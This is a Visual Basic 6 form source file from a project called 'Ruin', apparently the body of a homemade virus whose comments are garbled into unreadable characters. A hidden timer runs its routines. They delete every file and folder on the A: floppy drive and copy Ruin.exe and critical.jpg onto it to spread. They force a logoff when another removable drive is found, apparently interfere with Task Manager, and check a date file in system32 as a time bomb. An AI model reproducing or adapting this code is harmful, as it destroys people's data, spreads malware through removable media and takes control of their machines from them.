VERSION 5.00
Begin VB.Form Way 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Ruin"
   ClientHeight    =   1380
   ClientLeft      =   4890
   ClientTop       =   4965
   ClientWidth     =   3060
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1380
   ScaleWidth      =   3060
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   10000
      Left            =   2520
      Top             =   840
   End
End
Attribute VB_Name = "Way"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim obj As New Ruin.Windir
Dim c As String
Dim b As Variant
Dim strFileName As String
Dim fsysObj As New Scripting.FileSystemObject
Dim drvItem As Drive
Dim time As Integer '���������� ����� �� ����������� Windows
'��� ����������� Windows
Const EWX_SHUTDOWN = 1
Const EWX_REBOOT = 2
Const EWX_LOGOFF = 0
Const EWX_FORCE = 4
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Sub Timer1_Timer()
'�������� �� ������� ����� DataForBegin
strFileName = dir(obj.dir & "\system32\")
Do While strFileName <> ""
If strFileName = "DateForBegin" Then TimeIsEnd: GoTo endtmr1
strFileName = dir
Loop
'��� ����������� ��� ���������� ����� �����
FerstVir
endtmr1:
'������������� ������
Dicks
'����������� ������
DoVirus
End Sub
Private Sub Vakcina()
'��� ����������� ��� �������������� ����.
Open obj.dir & "\system32\RuinVak" For Binary As #2
Get #2, , b
If b < Now Then obj.Save: Close #2: GoTo 2
Close #2
GoTo endVak
2:
Kill obj.dir & "\system32\RuinVak"
endVak:
End Sub
Private Sub TimeIsEnd()
'�������� ������� �������
strFileName = dir(obj.dir & "\system32\")
Do While strFileName <> ""
If strFileName = "RuinVak" Then Vakcina: GoTo endtime
strFileName = dir
Loop
'�������� �� ���������� ����� ����������� ����.
Open obj.dir & "\system32\DateForBegin" For Binary As #1
Get #1, , b
If b < Now Then GoTo tmsnd
GoTo end1
'�����������
tmsnd:
Apocalipcis
end1:
Close #1
endtime:
End Sub
Private Sub Dicks()
Dim strdrv As String
For Each drvItem In fsysObj.Drives
' ���� ���� ����� � ������, �����
strdrv = drvItem
If drvItem.IsReady Then
   '����������� ���� ������� �����
   If Not (drvItem.DriveType = Fixed) Then
      If strdrv = "A:" Then
        '������� ��� ����� � ����� (����� ������) �� ����������� A:\
         DeleteFileA "A:\"
         '��������� ������� ������ �� A:\
         '�, ���� ���, ���������� ����� � A:\
         strFileName = dir("A:\")
         Do While strFileName <> ""
         If Not (strFileName = "Ruin.exe" And strFileName = "critical.jpg") Then FileCopy App.Path & "\Ruin.exe", "A:\Ruin.exe": FileCopy App.Path & "\critical.jpg", "A:\critical.jpg": GoTo nxtItem
         strFileName = dir
         Loop
       Else
        '����� ��� ������ �������� - CD/DVD
         Informasion.Show vbModal
        '����� ��� ������ �� �������
         ExitWindowsEx EWX_FORCE, 0
      End If
   End If
End If
nxtItem:
Next drvItem
End Sub

Private Sub FerstVir()
strFileName = dir(Left(obj.dir, 3) & "Documents and Settings\All Users\������� ����\���������\������������\")
Do While strFileName <> ""
If strFileName = "StepTwo.exe" Then Kill Left(obj.dir, 3) & "Documents and Settings\All Users\������� ����\���������\������������\StepTwo.exe"
strFileName = dir
Loop
obj.Save
obj.taskmgrUnl
Blunder.Show vbModal
End Sub

Private Sub DoVirus()

End Sub

Sub DeleteFileA(CurrentPath)
Dim intN As Integer, IntDirectory As Integer
Dim strFileName As String
' ������� ����������� ��� ������� ����� � ������� ��������
strFileName = dir(CurrentPath)
Do While strFileName <> ""
If Not (strFileName = "Ruin.exe" Or strFileName = "critical.jpg") Then Kill CurrentPath & strFileName
strFileName = dir
Loop
' ������ ��������� ��������� ������ ������������
strFileName = dir(CurrentPath, vbDirectory)
Do While strFileName <> ""
' ���������� ������� � ������������ ��������,
' � ����� ���� �������� Windows NT
If strFileName <> "." And strFileName <> ".." And strFileName <> "pagefile.sys" Then
' ���������� ���, ��� ���������� �� ���������
If GetAttr(CurrentPath & strFileName) And vbDirectory Then
fsysObj.DeleteFolder (CurrentPath & strFileName)
End If
End If
strFileName = dir
' ������������ ������ �������
DoEvents
Loop
End Sub
Private Static Sub Apocalipcis()
time = time + 10
If time = 180 Then RestartWindows
End Sub

Private Sub RestartWindows()
' ������������� Windows (����������� � Windows 95/NT)
ExitWindowsEx EWX_LOGOFF, 0
End Sub
